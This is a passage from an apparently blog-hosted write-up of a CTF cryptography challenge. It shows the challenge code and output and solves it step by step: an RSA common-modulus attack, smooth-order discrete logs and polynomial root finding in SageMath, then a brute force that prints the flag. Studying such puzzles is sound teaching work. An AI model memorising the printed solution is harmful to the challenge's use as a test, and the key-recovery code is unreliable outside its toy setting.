<span class="n">diamond_ticket</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">diamond_ticket</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="n">flag_chocolate</span> <span class="o">=</span> <span class="n">chocolate_generator</span><span class="p">(</span><span class="n">diamond_ticket</span><span class="p">)</span>
<span class="n">chocolate_bag</span> <span class="o">=</span> <span class="p">[]</span>

<span class="c1">#Willy Wonka are making chocolates
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1337</span><span class="p">):</span> <span class="c1"># 1337 random szám
</span>    <span class="n">chocolate_bag</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">getRandomRange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span>

<span class="c1">#And he put the golden ticket at the end
</span><span class="n">chocolate_bag</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag_chocolate</span><span class="p">)</span> <span class="c1"># az utolsó a flag
</span>
<span class="c1">#Augustus ate lots of chocolates, but he can't eat all cuz he is full now :D
</span><span class="n">remain</span> <span class="o">=</span> <span class="n">chocolate_bag</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span> <span class="c1"># az első 4 random szám, az utolsó a flag
</span>
<span class="c1">#Compress all remain chocolates into one
</span><span class="n">remain_bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">c</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span><span class="o">//</span><span class="mi">8</span><span class="p">,</span> <span class="s">"big"</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">remain</span><span class="p">])</span> 

<span class="c1">#The last chocolate is too important, so Willy Wonka did magic again
</span><span class="n">P</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">Q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
<span class="n">N</span> <span class="o">=</span> <span class="n">P</span> <span class="o">*</span> <span class="n">Q</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s">"idek{this_is_a_fake_flag_lolol}"</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">P</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">Q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
<span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">remain_bytes</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
<span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">remain_bytes</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span> <span class="c1"># A small gift
</span>
<span class="c1">#How can you get it ?
</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">N</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">c1</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">c2</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span> 
</code></pre></div></div>

<p>As well as the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867
c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301
c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649
</code></pre></div></div>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>This challenge consists of multiple parts. Firstly, we are given two RSA ciphertexts of the same message with the same modulus. The encrypted message is <code class="language-plaintext highlighter-rouge">remain_bytes</code>, which consists of five concatenated elements of <code class="language-plaintext highlighter-rouge">chocolate_bag</code>. Four of these are random numbers, while the final element is <code class="language-plaintext highlighter-rouge">flag_chocolate</code>.</p>

<p><code class="language-plaintext highlighter-rouge">flag_chocolate</code> is the flag output of the <code class="language-plaintext highlighter-rouge">chocolate_generator(m)</code> function.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">chocolate_generator</span><span class="p">(</span><span class="n">m</span><span class="p">:</span><span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="k">return</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="nb">pow</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">p</span><span class="p">))</span> <span class="o">%</span> <span class="n">p</span>
</code></pre></div></div>

<p>We must recover <code class="language-plaintext highlighter-rouge">flag_chocolate</code> from the RSA output, and then recover the message $m$ from the equation</p>

\[\large a^{m} + b^{m} \mod p\]

<p>Where $m$ is the 20-byte plaintext flag</p>

<h5 id="recovering-flag_chocolate">Recovering flag_chocolate</h5>

<p>Like previously mentioned, we are given two RSA samples of the same message, encrypted with different exponents but the same modulus. This makes the plaintext susceptible to an RSA common modulus attack. We can use the implementation from <code class="language-plaintext highlighter-rouge">jvdsn</code>’s repo: https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/common_modulus.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">c2</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">xgcd</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">)</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="k">if</span> <span class="n">u</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="nb">pow</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">),</span> <span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="n">p2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="nb">pow</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">),</span> <span class="o">-</span><span class="n">v</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p1</span> <span class="o">*</span> <span class="n">p2</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span><span class="p">).</span><span class="n">nth_root</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>
</code></pre></div></div>

<p>We can simply input the parameters from the source code, and we easily recover <code class="language-plaintext highlighter-rouge">flag_chooclate</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">N</span> <span class="o">=</span> <span class="mi">85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867</span>
<span class="n">c1</span> <span class="o">=</span> <span class="mi">27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301</span>
<span class="n">c2</span> <span class="o">=</span> <span class="mi">30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649</span>
<span class="n">e1</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s">"idek{this_is_a_fake_flag_lolol}"</span><span class="p">)</span>
<span class="n">e2</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">remain_bytes</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">attack</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">e1</span><span class="p">,</span><span class="n">c1</span><span class="p">,</span><span class="n">e2</span><span class="p">,</span><span class="n">c2</span><span class="p">))</span>
<span class="n">remain</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">remain_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span> <span class="s">"big"</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">remain_bytes</span><span class="p">),</span> <span class="mi">16</span><span class="p">)]</span>
<span class="n">flag_chocolate</span> <span class="o">=</span> <span class="n">remain</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="c1"># 99584795316725433978492646071734128819
</span></code></pre></div></div>

<h5 id="recovering-the-original-m">Recovering the original m</h5>

<p>With <code class="language-plaintext highlighter-rouge">flag_chocolate</code> recovered, we now must recover the original flag from the equation. From here on, we denote <code class="language-plaintext highlighter-rouge">flag_chocolate</code> as $S$.</p>

\[\large S \equiv a^{m} + b^{m} \mod p\]

<p>Firstly, we notice that $p$ is a prime. We therefore work in the finite field $\mathbb{F}_{p}$. In SageMath, we can check the order $r$ of the field:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">p</span>  <span class="o">=</span> <span class="mi">170829625398370252501980763763988409583</span>
<span class="p">....:</span> <span class="n">a</span>  <span class="o">=</span> <span class="mi">164164878498114882034745803752027154293</span>
<span class="p">....:</span> <span class="n">b</span>  <span class="o">=</span> <span class="mi">125172356708896457197207880391835698381</span>
<span class="p">....:</span> <span class="n">F</span>  <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">F</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="n">multiplicative_order</span><span class="p">()</span>
<span class="mi">85414812699185126250990381881994204791</span>
</code></pre></div></div>

<p>It turns out, the order of the field is surprisingly smooth:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">factor</span><span class="p">(</span><span class="n">F</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="n">multiplicative_order</span><span class="p">())</span>
<span class="mi">40841</span> <span class="o">*</span> <span class="mi">50119</span> <span class="o">*</span> <span class="mi">51193</span> <span class="o">*</span> <span class="mi">55823</span> <span class="o">*</span> <span class="mi">57809</span> <span class="o">*</span> <span class="mi">61991</span> <span class="o">*</span> <span class="mi">63097</span> <span class="o">*</span> <span class="mi">64577</span>
</code></pre></div></div>

<p>This means calculating discrete logs is quite easy. We can calculate the discrete log</p>

\[\large b = a^{k} \mod p\]

<p>for some $k$. Afterwards, we can rewrite our equation to:</p>

\[\large S \equiv a^{m} + a^{mk} \mod p\]

<p>The discrete log is easily calculable in SageMath, and since the order is smooth, it is almost instant:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">r</span> <span class="o">=</span> <span class="n">F</span><span class="p">(</span><span class="n">a</span><span class="p">).</span><span class="n">multiplicative_order</span><span class="p">()</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">k</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="n">F</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">F</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="nb">ord</span><span class="o">=</span><span class="n">r</span><span class="p">)</span>
<span class="c1"># 73331
</span></code></pre></div></div>

<p>The exponent $k = 73331$, which seems intentional considering it is $13337$ backwards. We denote $a^{m}$ as $x$, and we are now left with the polynomial:</p>

\[\large x + x^{k} - S \equiv 0 \mod p\]

<p>By finding the root of this polynomial, we can find $a^{m} \bmod p$, where we can again solve for the discrete log, retrieving $m$. However, simply attempting <code class="language-plaintext highlighter-rouge">f.roots(multiplicities=False)</code> in SageMath is not enough. I used the <code class="language-plaintext highlighter-rouge">Cantor - Zassnehaus</code> method to find the root:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="n">k</span> <span class="o">-</span> <span class="n">flag_chocolate</span>

<span class="k">def</span> <span class="nf">unique_root</span><span class="p">(</span><span class="n">poly</span><span class="p">):</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">F</span><span class="p">.</span><span class="n">characteristic</span><span class="p">()</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">g</span> <span class="o">=</span> <span class="n">R</span><span class="p">.</span><span class="n">random_element</span><span class="p">(</span><span class="n">degree</span><span class="o">=</span><span class="n">poly</span><span class="p">.</span><span class="n">degree</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">h</span> <span class="o">=</span> <span class="p">(</span><span class="n">power_mod</span><span class="p">(</span><span class="n">g</span><span class="p">,(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">poly</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">).</span><span class="n">gcd</span><span class="p">(</span><span class="n">poly</span><span class="p">)</span>
        <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="n">h</span><span class="p">.</span><span class="n">degree</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">poly</span><span class="p">.</span><span class="n">degree</span><span class="p">():</span>
            <span class="n">poly</span> <span class="o">=</span> <span class="n">h</span>  
            <span class="k">if</span> <span class="n">poly</span><span class="p">.</span><span class="n">degree</span><span class="p">()</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">poly</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  

<span class="n">root</span> <span class="o">=</span> <span class="n">unique_root</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>  
<span class="c1"># 126961729658296101306560858021273501485
</span></code></pre></div></div>

<p>With the root $a^{m} \bmod p$ recovered, we can now recover $m$ using the discrete log:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">m</span> <span class="o">=</span> <span class="n">discrete_log</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">F</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="nb">ord</span><span class="o">=</span><span class="n">r</span><span class="p">)</span>  
<span class="c1"># 4807895356063327854843653048517090061
</span></code></pre></div></div>

<p>However, the recovered $m$ is not the complete plaintext. The original plaintext is 20 bytes, or rather 159 bits (because of leading 0 bit in ascii) while our modulus $p$ is 128 bits. To recover the complete 160 bit plaintext flag, we must lift the modulus and brute-force the missing factor $k$:</p>

\[\large \text{flag} = m + k \cdot r\]

<p>To verify if the flag is correct (or at least a candidate), we can check whether all flag bytes are printable ascii (between 32 and 126). With a 127 bit modulus $r$ and a 160 bit plaintext, the missing factor $k$ has an upper bound of $2^{33}$. This is doable in python/SageMath, but can be done a lot faster in a low-level language like c++ or rust. I wrote a brute-force code in c++ which iterates over possible values $k$ and prints the flag candidates:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>idek{ cm &amp;d@05 CS*q_[6Xxo}, k = 2164788270
idek{"pVJWCNmgg59#/c,A1lf}, k = 2301835951
idek{**}iVY9U:VhDtYv|Z@Un}, k = 2818307047
idek{+MUks($7Mgr}k^M9EMB0}, k = 2894242741
idek{,uMCt7xQoGqB+=Vkz"X0}, k = 2971516341
idek{-'0v|lsh/#JFnY?_!S\S}, k = 3017960554
idek{-;dC^#LP]I\3ke*iKIzV}, k = 3023235135
idek{-{=G(2|N955PXau;%,;"}, k = 3039904979
idek{9nRCVJsLMOij?QU/&amp;Dj4}, k = 3838593233
idek{=rL&gt;7&gt;`HH?z dwF#\Rsb}, k = 4106985107
idek{&gt;Xs\C7)bg1"_CB5p('| }, k = 4167075141
idek{&gt;`6D\-v^1DVo9nAbY{f?}, k = 4169101534
idek{@cL5&amp;a3iu~~jwMu~?68`}, k = 4303584005
idek{A-;4;6kR&amp;xjp"ebkaFYf}, k = 4356306351
idek{ALZ&gt;fE\}Lu,\6ku;5v/S}, k = 4364431722
idek{Aqcll#(*wLKg{k: 9x!a}, k = 4374101324
idek{D=7q7ZmjJU+/_SET(k&lt;Z}, k = 4560995163
idek{DjeT|t!M&amp;o#~TYeKTaL^}, k = 4572790903
idek{ETJ|+J+~B{q;f1$cJdO?}, k = 4633858014
idek{F\eth:*"=Oq5qXM0@I(Q}, k = 4702812636
idek{GGqO`:j0, OVhGk6`QI=}, k = 4764180304
idek{H+@B~2[q{UtzIEEU+&lt;7r}, k = 4823658243
idek{J$\Gu~.)Be{/#`@Y@a"7}, k = 4955536038
idek{L[&amp;RdOPDT2*D}q?Oi^Xu}, k = 5103517656
idek{N`(&lt;}~b*iHSmtz4'X68g}, k = 5238501878
idek{OH&amp;F`@GGUpsVMHkX![hM}, k = 5299072192
idek{P5bxoo)'46];&gt;`])&gt;)pE}, k = 5361011336
idek{Q.=k;. PCu,q#}OZ}|f6}, k = 5425984351
idek{TK%_6N?GvA@z.F Vvi$P}, k = 5634046613
idek{T}bLK\y7=7h"EKU&amp;!@PU}, k = 5647163128
idek{W)pA[}X(cS&gt;`w16l'cYn}, k = 5825761255
idek{Y6'g2eA?&lt;DfH$33f}:+@}, k = 5962757925
idek{YoFMQ?|I!,U'?hAYTwL`}, k = 5977671429
idek{^Swy+98nqf3F#M5 ZD- }, k = 6304603205
idek{a_DUV.bwgVg0G5=Q1Z+B}, k = 6508199347
idek{dX5Z:`_B:w E?2g`A96&gt;}, k = 6706871703
idek{d}Okl]'GAP^Re#-aPEHM}, k = 6716558528
idek{hdmhF2o7XO#XIY=&lt;7&amp;a[}, k = 6977415586
idek{iD(*_@q"aQ 6&gt;H#H' Mw}, k = 7035828582
idek{kV*_rGI-Q]z8z{+A[-v&lt;}, k = 7174207241
idek{l=Mt0@&amp;;3]+))wOQxxLW}, k = 7234554246
idek{n }W~-LJ(qb&lt;\kw4aR,#}, k = 7360708378
idek{ng0qo1rmR2_jS[;,Q1UM}, k = 7379167168
idek{o-Z4t_oZ[_.Fng} W0`&lt;}, k = 7430905097
idek{tks_f0r_ur_t1ck3t_xD}, k = 7781310273 &lt;- our flag
idek{u]aAv}2(KI~?.yrgmhxS}, k = 7844474986
idek{w_"knU](04jH_hi*&lt;.xy}, k = 7978609908
idek{zxZmPiv]iZ,1fSH|9_m,}, k = 8185709465
idek{~&gt;AkP(C2`p-DWPSe2=_t}, k = 8437894545
</code></pre></div></div>

<p>With $k = 7781310273$ we recover our flag: <code class="language-plaintext highlighter-rouge">idek{tks_f0r_ur_t1ck3t_xD}</code> !</p>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="RSA" /><category term="Common Modulus attack" /><category term="Diophantine" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry></feed>